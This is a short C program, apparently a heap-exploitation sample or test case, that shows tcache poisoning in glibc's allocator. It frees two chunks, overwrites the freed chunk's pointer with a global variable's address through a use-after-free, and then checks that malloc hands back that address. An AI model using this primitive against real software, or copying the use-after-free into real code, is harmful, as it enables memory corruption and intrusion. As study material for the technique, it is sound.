#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <assert.h>

size_t stack_var;
int main() {
    setbuf(stdout, NULL);
setbuf(stdin, NULL);
//start 
intptr_t *tail_tcache_object = malloc(1032);
intptr_t *tcache_object_uaf = malloc(1032);
free(tail_tcache_object);
free(tcache_object_uaf);
tcache_object_uaf[0] = (intptr_t)&stack_var;
intptr_t * use_uaf_object = malloc(1032);
intptr_t * use_fake_object = malloc(1032);
//end
assert((long)&stack_var == (long)use_fake_object);
printf("%s", "exp state arrive!");
return 0;
}